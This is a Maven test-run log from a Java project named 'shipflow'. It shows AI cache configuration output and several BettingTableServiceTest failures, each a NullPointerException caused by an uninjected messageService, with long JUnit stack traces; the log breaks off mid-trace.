2026-01-17T23:26:49.015Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Risk Analysis Cache:
2026-01-17T23:26:49.015Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:49.015Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Pitch TTL: infinite (0=infinite)
2026-01-17T23:26:49.015Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Cycle TTL: infinite (0=infinite)
2026-01-17T23:26:49.015Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Invalidate on data change: true
2026-01-17T23:26:49.015Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Q&A Cache:
2026-01-17T23:26:49.015Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:49.015Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - TTL: 3 hours (0=infinite)
2026-01-17T23:26:49.015Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Similarity threshold: 0.85
2026-01-17T23:26:49.015Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Max entries per context: 100
2026-01-17T23:26:49.015Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : AI Cache Service initialized with provider: in-memory
2026-01-17T23:26:49.015Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cache miss: pitch risk 999 (withAI=true)
2026-01-17T23:26:49.015Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      : AI Cache Configuration:
2026-01-17T23:26:49.015Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Master enabled: true
2026-01-17T23:26:49.015Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Provider: in-memory
2026-01-17T23:26:49.015Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Risk Analysis Cache:
2026-01-17T23:26:49.015Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:49.015Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Pitch TTL: infinite (0=infinite)
2026-01-17T23:26:49.015Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Cycle TTL: infinite (0=infinite)
2026-01-17T23:26:49.015Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Invalidate on data change: true
2026-01-17T23:26:49.015Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Q&A Cache:
2026-01-17T23:26:49.015Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:49.015Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - TTL: 3 hours (0=infinite)
2026-01-17T23:26:49.015Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Similarity threshold: 0.85
2026-01-17T23:26:49.015Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Max entries per context: 100
2026-01-17T23:26:49.015Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : AI Cache Service initialized with provider: in-memory
2026-01-17T23:26:49.015Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached pitch risk 1 (withAI=true, TTL=infinite)
2026-01-17T23:26:49.015Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Updated data version for pitch 1
2026-01-17T23:26:49.015Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cache invalidated due to data change: pitch 1
[INFO] Tests run: 7, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.004 s -- in com.github.farzadsedaghatbin.shipflow.service.AICacheServiceTest$PitchRiskCacheTests
[INFO] Tests run: 0, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.014 s -- in com.github.farzadsedaghatbin.shipflow.service.AICacheServiceTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.BettingTableServiceTest
[ERROR] Tests run: 17, Failures: 6, Errors: 0, Skipped: 0, Time elapsed: 0.199 s <<< FAILURE! -- in com.github.farzadsedaghatbin.shipflow.service.BettingTableServiceTest
[ERROR] com.github.farzadsedaghatbin.shipflow.service.BettingTableServiceTest.assignPitchToSlot_WhenPitchAlreadyAssigned_ShouldThrowException -- Time elapsed: 0.007 s <<< FAILURE!
java.lang.AssertionError: 

Expecting throwable message:
  "Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String)" because "this.messageService" is null"
to contain:
  "already assigned"
but did not.

Throwable that failed the check:

java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String)" because "this.messageService" is null
	at com.github.farzadsedaghatbin.shipflow.service.BettingTableService.lambda$assignPitchToSlot$18(BettingTableService.java:215)
	at java.base/java.util.Optional.ifPresent(Optional.java:178)
	at com.github.farzadsedaghatbin.shipflow.service.BettingTableService.assignPitchToSlot(BettingTableService.java:213)
	at com.github.farzadsedaghatbin.shipflow.service.BettingTableServiceTest.lambda$assignPitchToSlot_WhenPitchAlreadyAssigned_ShouldThrowException$5(BettingTableServiceTest.java:242)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	at org.assertj.core.api.AssertionsForClassTypes.catchThrowable(AssertionsForClassTypes.java:892)
	at org.assertj.core.api.Assertions.catchThrowable(Assertions.java:1366)
	at org.assertj.core.api.Assertions.assertThatThrownBy(Assertions.java:1210)
	at com.github.farzadsedaghatbin.shipflow.service.BettingTableServiceTest.assignPitchToSlot_WhenPitchAlreadyAssigned_ShouldThrowException(BettingTableServiceTest.java:242)
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728)
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131)
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156)
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147)
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35)
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57)
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57)
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103)
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85)
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47)
	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122)
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385)
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162)
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507)
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495)

	at com.github.farzadsedaghatbin.shipflow.service.BettingTableServiceTest.assignPitchToSlot_WhenPitchAlreadyAssigned_ShouldThrowException(BettingTableServiceTest.java:244)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)

[ERROR] com.github.farzadsedaghatbin.shipflow.service.BettingTableServiceTest.updateSlotDates_WhenAssignedPitchWontFit_ShouldThrowException -- Time elapsed: 0.001 s <<< FAILURE!
java.lang.AssertionError: 

Expecting throwable message:
  "Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String, Object[])" because "this.messageService" is null"
to contain:
  "Cannot resize slot"
but did not.

Throwable that failed the check:

java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String, Object[])" because "this.messageService" is null
	at com.github.farzadsedaghatbin.shipflow.service.BettingTableService.updateSlotDates(BettingTableService.java:338)
	at com.github.farzadsedaghatbin.shipflow.service.BettingTableServiceTest.lambda$updateSlotDates_WhenAssignedPitchWontFit_ShouldThrowException$10(BettingTableServiceTest.java:301)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	at org.assertj.core.api.AssertionsForClassTypes.catchThrowable(AssertionsForClassTypes.java:892)
	at org.assertj.core.api.Assertions.catchThrowable(Assertions.java:1366)
	at org.assertj.core.api.Assertions.assertThatThrownBy(Assertions.java:1210)
	at com.github.farzadsedaghatbin.shipflow.service.BettingTableServiceTest.updateSlotDates_WhenAssignedPitchWontFit_ShouldThrowException(BettingTableServiceTest.java:301)
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728)
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131)
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156)
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147)
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35)
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57)
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57)
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103)
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85)
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47)
	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122)
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385)
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162)
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507)
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495)

	at com.github.farzadsedaghatbin.shipflow.service.BettingTableServiceTest.updateSlotDates_WhenAssignedPitchWontFit_ShouldThrowException(BettingTableServiceTest.java:303)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)

[ERROR] com.github.farzadsedaghatbin.shipflow.service.BettingTableServiceTest.generateSlotsForCycle_WhenNoTeams_ShouldThrowException -- Time elapsed: 0.001 s <<< FAILURE!
java.lang.AssertionError: 

Expecting throwable message:
  "Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String)" because "this.messageService" is null"
to contain:
  "No teams found"
but did not.

Throwable that failed the check:

java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String)" because "this.messageService" is null
	at com.github.farzadsedaghatbin.shipflow.service.BettingTableService.generateSlotsForCycle(BettingTableService.java:175)
	at com.github.farzadsedaghatbin.shipflow.service.BettingTableServiceTest.lambda$generateSlotsForCycle_WhenNoTeams_ShouldThrowException$13(BettingTableServiceTest.java:378)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	at org.assertj.core.api.AssertionsForClassTypes.catchThrowable(AssertionsForClassTypes.java:892)
	at org.assertj.core.api.Assertions.catchThrowable(Assertions.java:1366)
	at org.assertj.core.api.Assertions.assertThatThrownBy(Assertions.java:1210)
	at com.github.farzadsedaghatbin.shipflow.service.BettingTableServiceTest.generateSlotsForCycle_WhenNoTeams_ShouldThrowException(BettingTableServiceTest.java:378)
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728)
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131)
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156)
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147)
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35)
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57)
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57)
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103)
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85)
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47)
